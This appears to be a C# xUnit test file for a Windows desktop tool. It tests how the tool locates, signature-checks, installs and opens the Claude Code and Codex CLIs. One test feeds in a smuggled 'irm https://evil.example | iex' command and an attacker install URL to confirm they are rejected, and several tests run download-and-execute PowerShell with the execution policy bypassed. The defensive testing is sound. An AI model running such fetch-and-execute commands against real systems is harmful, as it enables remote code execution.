using System.Text.Json.Nodes;
using OptimizationTool.Desktop.Bridge;
using OptimizationTool.Transport;

namespace OptimizationTool.Desktop.Tests;

/// <summary>CLI resolution (fresh PATH, known locations, signature + identity rules), shell.installClient and child PATH.</summary>
public sealed class CliResolutionTests
{
    private const string Doc = "https://app.optimizationtool.invalid/index.html";
    private const string Bridge = @"C:\Program Files\Optimization Tool\OptimizationTool.Mcp.exe";
    private const string Home = @"C:\Users\u";
    private const string Roaming = Home + @"\AppData\Roaming";
    private const string Local = Home + @"\AppData\Local";
    private const string Pf = @"C:\Program Files";
    private const string Npm = Roaming + @"\npm";
    private const string NativeClaude = Home + @"\.local\bin\claude.exe";
    private const string AppRoot = Local + @"\Claude-Data\claude_pzs8sxrjxfjjc\claude-code";
    private const string CodexInstaller = Local + @"\Programs\OpenAI\Codex\bin\codex.exe";
    private const string CodexApp = Pf + @"\WindowsApps\OpenAI.Codex_26.1027.3384.0_x64__2p2nqsd0c76g0";
    private const string Anthropic = "Anthropic, PBC";
    private const string OpenAi = "OpenAI OpCo, LLC";

    private readonly HashSet<string> _files = new(StringComparer.OrdinalIgnoreCase) { Bridge };
    private readonly Dictionary<string, List<string>> _dirs = new(StringComparer.OrdinalIgnoreCase);
    private readonly Dictionary<string, string> _publishers = new(StringComparer.OrdinalIgnoreCase);
    private readonly Dictionary<string, string> _packages = new(StringComparer.Ordinal);
    private string? _fresh = @"C:\Windows\system32";
    private string? _process = @"C:\Windows\system32";
    private readonly Runner _runner = new();
    private readonly Confirm _confirm = new();
    private readonly Launcher _launcher = new();
    private readonly Launcher _opener = new();

    private CliEnvironment Env => new()
    {
        FreshPath = () => _fresh,
        ProcessPath = () => _process,
        FileExists = _files.Contains,
        Subdirectories = d => _dirs.TryGetValue(d, out var l) ? l : [],
        SignedPublisher = p => _publishers.GetValueOrDefault(p),
        PackageLocation = f => _packages.GetValueOrDefault(f),
        UserProfile = Home,
        AppData = Roaming,
        LocalAppData = Local,
        ProgramFiles = Pf,
    };

    private CliLocator Locator => new(Env);

    private BridgeDispatcher Dispatcher(IInstallLauncher? launcher = null) =>
        new(new BridgeRouter(), new NoBackend(), DesktopLog.Disabled,
            clients: new ClientConnector(_runner, Locator, _confirm, Bridge, systemRoot: @"C:\Windows",
                fileExists: _files.Contains, installer: launcher ?? _launcher, opener: _opener));

    private sealed class NoBackend : IBackend
    {
        public Task<JsonObject> CallAsync(string method, JsonObject? parameters, CancellationToken ct) =>
            throw new InvalidOperationException("shell.* must not be forwarded");
    }

    private sealed class Confirm : IClientConfirmPrompt
    {
        public bool Answer = true;
        public readonly List<ClientConfirmView> Shown = [];
        public Task<bool> ConfirmAsync(ClientConfirmView view, CancellationToken ct) { Shown.Add(view); return Task.FromResult(Answer); }
    }

    private sealed class Launcher : IInstallLauncher
    {
        public bool Running;
        public bool Fails;
        public readonly List<InstallCommand> Started = [];
        public bool IsRunning => Running;
        public bool TryStart(InstallCommand command) { if (Fails) return false; Started.Add(command); return true; }
    }

    /// <summary>--version output per CLI path (default: a real-looking line for the file name); mcp get = not registered.</summary>
    private sealed class Runner : IProcessRunner
    {
        public readonly Dictionary<string, string> Versions = new(StringComparer.OrdinalIgnoreCase);
        public readonly List<ProcessCommand> Runs = [];

        public Task<ProcessResult> RunAsync(ProcessCommand c, TimeSpan timeout, CancellationToken ct)
        {
            Runs.Add(c);
            var cli = c.Argv[0];
            var args = c.Argv.Skip(1).ToArray();
            ProcessResult r = args switch
            {
                ["--version"] => new(0, Versions.TryGetValue(cli, out var v) ? v
                    : Path.GetFileNameWithoutExtension(cli) == "claude" ? "2.1.317 (Claude Code)\n" : "codex-cli 0.166.0-alpha.5.1\n", "", false),
                ["--help"] => new(0, CliHelp.Claude, "", false),
                ["exec", "--help"] => new(0, CliHelp.Codex, "", false),
                ["mcp", "get", _] => new(1, "", "No MCP server found with name: optimization-tool\n", false),
                _ => new(2, "", "", false),
            };
            return Task.FromResult(r);
        }
    }

    private async Task<JsonNode> Call(BridgeDispatcher d, string method, string client) =>
        JsonNode.Parse((await d.HandleAsync(
            $$$"""{"type":"rpc","id":5,"method":"{{{method}}}","params":{"client":"{{{client}}}"}}""", Doc, true, default))!)!;

    private async Task<JsonNode> Status(BridgeDispatcher d, string client) => (await Call(d, "shell.clientStatus", client))["result"]!;

    private void Dir(string parent, params string[] children) =>
        _dirs[parent] = children.Select(c => Path.Combine(parent, c)).ToList();

    // ---------- PATH ----------

    [Fact]
    public void Fresh_registry_path_is_searched_when_the_process_path_is_stale()
    {
        _fresh = @"C:\Windows\system32;" + Npm;
        _files.Add(Npm + @"\claude.cmd");
        Assert.Equal(new CliCandidate(Npm + @"\claude.cmd", "path"), Locator.Candidates("claude_code").First());

        _fresh = null; // registry unreadable → process PATH still works
        _process = @"C:\Windows\system32;" + Npm;
        Assert.Equal(new CliCandidate(Npm + @"\claude.cmd", "path"), Locator.Candidates("claude_code").First());
    }

    [Fact]
    public void Fresh_path_comes_before_process_path_and_duplicates_are_dropped()
    {
        _fresh = @"C:\New";
        _process = @"C:\Old;C:\New\";
        _files.UnionWith([@"C:\New\codex.exe", @"C:\Old\codex.exe"]);
        Assert.Equal([@"C:\New\codex.exe", @"C:\Old\codex.exe"], Locator.Candidates("codex").Select(c => c.Path));
        Assert.Equal([@"C:\New", @"C:\Old"], SystemPath.Directories(_fresh, _process));
    }

    // ---------- known locations ----------

    [Fact]
    public async Task Native_installer_claude_is_found_off_path()
    {
        _files.Add(NativeClaude);
        _publishers[NativeClaude] = Anthropic;
        var r = await Status(Dispatcher(), "claude_code");
        Assert.True(r["installed"]!.GetValue<bool>());
        Assert.Equal("installer", r["source"]!.GetValue<string>());
        Assert.Equal("2.1.317", r["version"]!.GetValue<string>());
        Assert.Null(r["app"]);
        Assert.Equal(NativeClaude, _runner.Runs[0].FileName);
    }

    [Fact]
    public void Claude_known_locations_in_order()
    {
        var winget = Local + @"\Microsoft\WinGet\Links\claude.exe";
        var wingetMachine = Pf + @"\WinGet\Links\claude.exe";
        var wingetPkg = Local + @"\Microsoft\WinGet\Packages\Anthropic.ClaudeCode_Microsoft.Winget.Source_8wekyb3d8bbwe\claude.exe";
        Dir(Local + @"\Microsoft\WinGet\Packages", "Anthropic.ClaudeCode_Microsoft.Winget.Source_8wekyb3d8bbwe", "Other.Tool_x");
        Dir(AppRoot, "2.1.317");
        Dir(AppRoot + @"\2.1.317", "a33aa5518497");
        var app = AppRoot + @"\2.1.317\a33aa5518497\claude.exe";
        foreach (var f in new[] { NativeClaude, winget, wingetMachine, wingetPkg, app }) { _files.Add(f); _publishers[f] = Anthropic; }
        _files.Add(Npm + @"\claude.cmd");
        _files.Add(Local + @"\Microsoft\WinGet\Packages\Other.Tool_x\claude.exe");

        Assert.Equal(
            [(NativeClaude, "installer"), (Npm + @"\claude.cmd", "npm"), (winget, "winget"), (wingetMachine, "winget"), (wingetPkg, "winget"), (app, "app")],
            Locator.Candidates("claude_code").Select(c => (c.Path, c.Source)));
    }

    [Fact]
    public void Codex_known_locations_in_order()
    {
        _packages[CliLocator.CodexAppFamily] = CodexApp;
        var winget = Local + @"\Microsoft\WinGet\Links\codex.exe";
        var app = CodexApp + @"\app\resources\codex.exe";
        var sandbox = Home + @"\.codex\.sandbox-bin\codex.exe";
        foreach (var f in new[] { CodexInstaller, winget, app, sandbox }) { _files.Add(f); _publishers[f] = OpenAi; }
        _files.Add(Npm + @"\codex.cmd");

        Assert.Equal(
            [(Npm + @"\codex.cmd", "npm"), (CodexInstaller, "installer"), (winget, "winget"), (app, "app"), (sandbox, "app")],
            Locator.Candidates("codex").Select(c => (c.Path, c.Source)));
    }

    [Fact]
    public async Task Claude_app_bundled_cli_picks_the_highest_version()
    {
        Dir(AppRoot, "2.1.309", "2.1.40", "2.10.0", "latest");
        foreach (var v in new[] { "2.1.309", "2.1.40", "2.10.0" })
        {
            Dir(AppRoot + @"\" + v, "h" + v.Replace(".", ""));
            var exe = $@"{AppRoot}\{v}\h{v.Replace(".", "")}\claude.exe";
            _files.Add(exe);
            _publishers[exe] = Anthropic;
        }
        Assert.Equal(
            [$@"{AppRoot}\2.10.0\h2100\claude.exe", $@"{AppRoot}\2.1.309\h21309\claude.exe", $@"{AppRoot}\2.1.40\h2140\claude.exe"],
            Locator.Candidates("claude_code").Select(c => c.Path));

        var r = await Status(Dispatcher(), "claude_code");
        Assert.Equal("app", r["source"]!.GetValue<string>());
        Assert.Equal($@"{AppRoot}\2.10.0\h2100\claude.exe", _runner.Runs[0].FileName);
    }

    [Theory]
    [InlineData(@"C:\Program Files\WindowsApps\Claude_4.16336.0.0_x64__pzs8sxrjxfjjc\app")]
    [InlineData(@"C:\Users\u\AppData\Local\Microsoft\WindowsApps")]
    [InlineData(@"C:\Users\u\AppData\Local\Microsoft\WindowsApps\Claude_pzs8sxrjxfjjc")]
    [InlineData(@"C:\Users\u\AppData\Local\AnthropicClaude")]
    [InlineData(@"C:\Users\u\AppData\Local\AnthropicClaude\app-1.0.0")]
    public async Task Desktop_app_claude_exe_is_never_a_candidate(string dir)
    {
        _fresh = dir;
        var exe = dir + @"\claude.exe";
        _files.Add(exe);
        _publishers[exe] = Anthropic;
        Assert.Empty(Locator.Candidates("claude_code"));
        var r = await Status(Dispatcher(), "claude_code");
        Assert.False(r["installed"]!.GetValue<bool>());
        Assert.Empty(_runner.Runs); // never launched, not even for --version
    }

    [Theory]
    [InlineData(null)]
    [InlineData("Anthropic PBC")]
    [InlineData("anthropic, pbc")]
    [InlineData("OpenAI OpCo, LLC")]
    [InlineData("Anthropic, PBC Evil")]
    public void Unsigned_or_wrong_publisher_exe_outside_path_is_rejected(string? publisher)
    {
        _files.Add(NativeClaude);
        if (publisher is not null) _publishers[NativeClaude] = publisher;
        Assert.Empty(Locator.Candidates("claude_code"));
    }

    [Fact]
    public void Codex_exe_signed_by_another_publisher_is_rejected()
    {
        _files.Add(CodexInstaller);
        _publishers[CodexInstaller] = Anthropic;
        Assert.Empty(Locator.Candidates("codex"));
        _publishers[CodexInstaller] = OpenAi;
        Assert.Equal("installer", Assert.Single(Locator.Candidates("codex")).Source);
    }

    [Fact]
    public void On_path_an_unsigned_exe_is_still_a_candidate_for_the_identity_check()
    {
        _fresh = @"C:\Tools";
        _files.Add(@"C:\Tools\codex.exe");
        Assert.Equal("path", Assert.Single(Locator.Candidates("codex")).Source);
    }

    [Theory]
    [InlineData(Npm + @"\claude.cmd", true)]
    [InlineData(Npm + @"\CLAUDE.CMD", true)]
    [InlineData(Npm + @"\sub\claude.cmd", false)]
    [InlineData(@"C:\Tools\claude.cmd", false)]
    [InlineData(Roaming + @"\npm2\claude.cmd", false)]
    [InlineData(Npm + @"\claude.bat", false)]
    [InlineData(Npm + @"\claude.ps1", false)]
    public void Cmd_outside_path_is_accepted_only_in_the_npm_folder(string path, bool expected) =>
        Assert.Equal(expected, Locator.AcceptableOutsidePath(path, Anthropic));

    // ---------- identity + cache ----------

    [Fact]
    public async Task Identity_check_skips_a_non_cli_and_caches_the_result()
    {
        _fresh = @"C:\Other";
        _files.Add(@"C:\Other\claude.exe");
        _runner.Versions[@"C:\Other\claude.exe"] = "claude 4.16 (some other tool)\n";
        _files.Add(NativeClaude);
        _publishers[NativeClaude] = Anthropic;

        var d = Dispatcher();
        var r = await Status(d, "claude_code");
        Assert.Equal("installer", r["source"]!.GetValue<string>());
        Assert.Equal([@"C:\Other\claude.exe", NativeClaude, NativeClaude, NativeClaude, NativeClaude], _runner.Runs.Select(c => c.FileName)); // version, help, mcp get, auth status

        _runner.Runs.Clear();
        await Call(d, "shell.unregisterClient", "claude_code"); // cached: no new identity checks
        Assert.All(_runner.Runs, c => Assert.Equal(NativeClaude, c.FileName));
        Assert.DoesNotContain(_runner.Runs, c => c.Argv.Skip(1).SequenceEqual(["--version"]));
    }

    [Theory]
    [InlineData("codex 1.0\n")]
    [InlineData("2.1.317\n")]
    [InlineData("")]
    public async Task Codex_identity_requires_codex_cli(string output)
    {
        _fresh = @"C:\Tools";
        _files.Add(@"C:\Tools\codex.exe");
        _runner.Versions[@"C:\Tools\codex.exe"] = output;
        var r = await Status(Dispatcher(), "codex");
        Assert.False(r["installed"]!.GetValue<bool>());
    }

    [Fact]
    public async Task Re_resolves_when_the_cached_cli_is_gone_or_was_not_installed()
    {
        var d = Dispatcher();
        Assert.False((await Status(d, "claude_code"))["installed"]!.GetValue<bool>());

        _files.Add(NativeClaude); // installed while the app is open
        _publishers[NativeClaude] = Anthropic;
        Assert.Equal("installer", (await Status(d, "claude_code"))["source"]!.GetValue<string>());

        _files.Remove(NativeClaude); // moved to npm
        _files.Add(Npm + @"\claude.cmd");
        Assert.Equal("npm", (await Status(d, "claude_code"))["source"]!.GetValue<string>());
    }

    // ---------- app: true ----------

    [Fact]
    public async Task Claude_app_installed_without_cli_reports_app()
    {
        _packages[CliLocator.ClaudeAppFamily] = Pf + @"\WindowsApps\Claude_4.16336.0.0_x64__pzs8sxrjxfjjc";
        var r = await Status(Dispatcher(), "claude_code");
        Assert.False(r["installed"]!.GetValue<bool>());
        Assert.True(r["app"]!.GetValue<bool>());
        Assert.Null(r["source"]);

        _packages.Clear();
        _files.Add(Local + @"\AnthropicClaude\claude.exe"); // older non-Store installer
        Assert.True((await Status(Dispatcher(), "claude_code"))["app"]!.GetValue<bool>());

        _packages[CliLocator.CodexAppFamily] = CodexApp; // codex never reports app
        Assert.Null((await Status(Dispatcher(), "codex"))["app"]);
    }

    [Fact]
    public async Task App_flag_is_absent_once_a_cli_is_found()
    {
        _packages[CliLocator.ClaudeAppFamily] = Pf + @"\WindowsApps\Claude_4.16336.0.0_x64__pzs8sxrjxfjjc";
        _files.Add(NativeClaude);
        _publishers[NativeClaude] = Anthropic;
        var r = await Status(Dispatcher(), "claude_code");
        Assert.True(r["installed"]!.GetValue<bool>());
        Assert.Null(r["app"]);
    }

    // ---------- shell.openClient ----------

    [Fact]
    public async Task Open_starts_the_resolved_cli_with_the_fixed_question_and_no_confirm()
    {
        _fresh = @"C:\Tools\it's";
        _files.Add(@"C:\Tools\it's\codex.exe");
        var r = (await Call(Dispatcher(), "shell.openClient", "codex"))["result"]!;
        Assert.Equal("""{"status":"opened"}""", r.ToJsonString());
        Assert.Empty(_confirm.Shown);
        var started = Assert.Single(_opener.Started);
        Assert.Equal(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", started.FileName);
        Assert.Equal(["-NoProfile", "-NoExit", "-Command", @"& 'C:\Tools\it''s\codex.exe' 'Use Optimization Tool to check my PC.'"], started.ArgumentList);
        Assert.Empty(_launcher.Started);
    }

    [Fact]
    public async Task Open_without_a_cli_or_when_start_fails()
    {
        Assert.Equal("""{"status":"not_installed"}""", (await Call(Dispatcher(), "shell.openClient", "claude_code"))["result"]!.ToJsonString());
        _fresh = @"C:\Tools";
        _files.Add(@"C:\Tools\codex.exe");
        _opener.Fails = true;
        Assert.Equal("""{"status":"failed","error":"start_failed"}""", (await Call(Dispatcher(), "shell.openClient", "codex"))["result"]!.ToJsonString());
        Assert.Contains("shell.openClient", (IReadOnlySet<string>)BridgeRouter.ShellMethods);
        Assert.DoesNotContain("shell.openClient", (IReadOnlySet<string>)BridgeRouter.DesktopMethods);
    }

    // ---------- shell.installClient ----------

    [Theory]
    [InlineData("claude_code", "Install Claude Code?", "irm https://claude.ai/install.ps1 | iex")]
    [InlineData("codex", "Install Codex?", "irm https://chatgpt.com/codex/install.ps1 | iex")]
    public async Task Install_confirms_then_starts_the_fixed_powershell_command(string client, string title, string script)
    {
        var r = (await Call(Dispatcher(), "shell.installClient", client))["result"]!;
        Assert.Equal("""{"status":"started"}""", r.ToJsonString());

        var view = Assert.Single(_confirm.Shown);
        Assert.Equal(title, view.Title);
        Assert.Equal("Install", view.Verb);
        Assert.Equal(script, view.Command);
        const string ps = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
        Assert.Equal(ps, view.BridgePath);

        var started = Assert.Single(_launcher.Started);
        Assert.Equal(ps, started.FileName);
        Assert.Equal(["-NoProfile", "-ExecutionPolicy", "Bypass", "-NoExit", "-Command", script], started.ArgumentList);
        Assert.Empty(_runner.Runs);
    }

    [Fact]
    public async Task Install_cancel_starts_nothing()
    {
        _confirm.Answer = false;
        Assert.Equal("""{"status":"cancelled"}""", (await Call(Dispatcher(), "shell.installClient", "codex"))["result"]!.ToJsonString());
        Assert.Empty(_launcher.Started);
    }

    [Fact]
    public async Task Install_one_at_a_time_and_failures()
    {
        _launcher.Running = true;
        Assert.Equal("""{"status":"failed","error":"already_running"}""", (await Call(Dispatcher(), "shell.installClient", "codex"))["result"]!.ToJsonString());
        Assert.Empty(_confirm.Shown);

        _launcher.Running = false;
        _launcher.Fails = true;
        Assert.Equal("""{"status":"failed","error":"start_failed"}""", (await Call(Dispatcher(), "shell.installClient", "codex"))["result"]!.ToJsonString());
    }

    [Fact]
    public async Task Install_while_a_confirm_is_open_is_busy()
    {
        var gate = new TaskCompletionSource<bool>();
        var slow = new SlowConfirm(gate.Task);
        var d = new BridgeDispatcher(new BridgeRouter(), new NoBackend(), DesktopLog.Disabled,
            clients: new ClientConnector(_runner, Locator, slow, Bridge, systemRoot: @"C:\Windows", fileExists: _files.Contains, installer: _launcher));
        var first = Call(d, "shell.installClient", "claude_code");
        var second = await Call(d, "shell.installClient", "codex");
        Assert.Equal("busy", second["error"]!["data"]!["reason"]!.GetValue<string>());
        // Status checks are not blocked by the install confirm.
        Assert.False((await Status(d, "codex"))["installed"]!.GetValue<bool>());
        gate.SetResult(true);
        Assert.Equal("started", (await first)["result"]!["status"]!.GetValue<string>());
        Assert.Single(_launcher.Started);
    }

    private sealed class SlowConfirm(Task<bool> answer) : IClientConfirmPrompt
    {
        public Task<bool> ConfirmAsync(ClientConfirmView view, CancellationToken ct) => answer;
    }

    [Theory]
    [InlineData("""{"client":"claude"}""")]
    [InlineData("""{"client":"codex","command":"irm https://evil.example | iex"}""")]
    [InlineData("""{"client":"codex","url":"https://evil.example/install.ps1"}""")]
    [InlineData("""{"client":["codex"]}""")]
    [InlineData("{}")]
    [InlineData("null")]
    public async Task Install_rejects_bad_params(string paramsJson)
    {
        var reply = JsonNode.Parse((await Dispatcher().HandleAsync(
            $$$"""{"type":"rpc","id":1,"method":"shell.installClient","params":{{{paramsJson}}}}""", Doc, true, default))!)!;
        Assert.Equal(-32602, reply["error"]!["code"]!.GetValue<int>());
        Assert.Empty(_confirm.Shown);
        Assert.Empty(_launcher.Started);
    }

    [Fact]
    public async Task Install_is_shell_only_and_ignores_frames()
    {
        Assert.Contains("shell.installClient", (IReadOnlySet<string>)BridgeRouter.ShellMethods);
        Assert.DoesNotContain("shell.installClient", (IReadOnlySet<string>)BridgeRouter.DesktopMethods);
        const string msg = """{"type":"rpc","id":1,"method":"shell.installClient","params":{"client":"codex"}}""";
        Assert.Null(await Dispatcher().HandleAsync(msg, Doc, isTopLevel: false, default));
        Assert.Null(await Dispatcher().HandleAsync(msg, "https://evil.example/", isTopLevel: true, default));
        Assert.Empty(_launcher.Started);
    }

    [Fact]
    public void Installer_console_is_visible_unelevated_and_not_redirected()
    {
        var command = new ClientConnector(_runner, Locator, _confirm, Bridge, systemRoot: @"C:\Windows").InstallCommandFor("codex");
        var psi = ConsoleInstallLauncher.BuildStartInfo(command, @"C:\Fresh;C:\Old");
        Assert.False(psi.UseShellExecute);
        Assert.False(psi.CreateNoWindow);
        Assert.False(psi.RedirectStandardInput || psi.RedirectStandardOutput || psi.RedirectStandardError);
        Assert.Equal("", psi.Verb);
        Assert.Equal(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", psi.FileName);
        Assert.Equal(["-NoProfile", "-ExecutionPolicy", "Bypass", "-NoExit", "-Command", "irm https://chatgpt.com/codex/install.ps1 | iex"], psi.ArgumentList);
        Assert.Equal(@"C:\Fresh;C:\Old", psi.Environment["PATH"]);
    }

    // ---------- child PATH ----------

    [Fact]
    public void Child_path_is_the_fresh_path_plus_missing_process_entries()
    {
        Assert.Equal(@"C:\Windows;C:\Users\u\AppData\Roaming\npm;C:\Program Files\nodejs;C:\Extra",
            SystemPath.ForChildren(@"C:\Windows;C:\Users\u\AppData\Roaming\npm;C:\Program Files\nodejs", @"C:\Windows\;C:\Extra;c:\users\u\appdata\roaming\npm"));
        Assert.Equal(@"C:\Old", SystemPath.ForChildren(null, @"C:\Old"));
        Assert.Equal(@"C:\Old", SystemPath.ForChildren("", @"C:\Old"));
    }

    [Fact]
    public void Process_runner_sets_only_path_in_the_child_environment()
    {
        var command = ProcessCommand.ForCli(@"C:\npm\claude.cmd", ["--version"], @"C:\Windows")!;
        var psi = ProcessRunner.BuildStartInfo(command, @"C:\Fresh;C:\npm");
        Assert.Equal(@"C:\Fresh;C:\npm", psi.Environment["PATH"]);
        Assert.True(psi.CreateNoWindow);
        Assert.False(psi.UseShellExecute);
        // Everything else is inherited unchanged.
        Assert.Equal(Environment.GetEnvironmentVariable("SystemRoot"), psi.Environment["SystemRoot"]);
        Assert.Equal(Environment.GetEnvironmentVariable("USERPROFILE"), psi.Environment["USERPROFILE"]);

        var unchanged = ProcessRunner.BuildStartInfo(command, null);
        Assert.Equal(Environment.GetEnvironmentVariable("PATH"), unchanged.Environment["PATH"]);
    }

    [Fact]
    public void Organization_is_read_from_the_subject()
    {
        Assert.Equal("Anthropic, PBC", Authenticode.Organization(new System.Security.Cryptography.X509Certificates.X500DistinguishedName(
            "CN=\"Anthropic, PBC\", O=\"Anthropic, PBC\", L=San Francisco, S=California, C=US")));
        Assert.Null(Authenticode.Organization(new System.Security.Cryptography.X509Certificates.X500DistinguishedName("CN=Someone, C=US")));
    }
}

/// <summary>Read-only check on the real PC: resolves both CLIs (runs --version and mcp get only).</summary>
public sealed class CliResolutionLiveTests(Xunit.Abstractions.ITestOutputHelper output)
{
    private sealed class Yes : IClientConfirmPrompt
    {
        public Task<bool> ConfirmAsync(ClientConfirmView view, CancellationToken ct) => throw new InvalidOperationException("no prompts in a live check");
    }

    private sealed class NoBackend : IBackend
    {
        public Task<JsonObject> CallAsync(string method, JsonObject? parameters, CancellationToken ct) => throw new InvalidOperationException();
    }

    [Fact]
    [Trait("Category", "Live")]
    public async Task Resolves_both_clis_on_this_pc()
    {
        foreach (var client in new[] { "claude_code", "codex" })
        {
            foreach (var c in CliLocator.System.Candidates(client)) output.WriteLine($"{client} candidate: {c.Source} {c.Path}");
            var connector = new ClientConnector(new ProcessRunner(), CliLocator.System, new Yes(), ClientConnector.DefaultBridgePath);
            var d = new BridgeDispatcher(new BridgeRouter(), new NoBackend(), DesktopLog.Disabled, clients: connector);
            var reply = await d.HandleAsync(
                $$$"""{"type":"rpc","id":1,"method":"shell.clientStatus","params":{"client":"{{{client}}}"}}""",
                "https://app.optimizationtool.invalid/index.html", true, default);
            output.WriteLine($"{client} status: {JsonNode.Parse(reply!)!["result"]!.ToJsonString()}");
            output.WriteLine($"{client} resolved: {connector.ResolvedFor(client)?.Source} {connector.ResolvedFor(client)?.Path}");
        }
    }
}
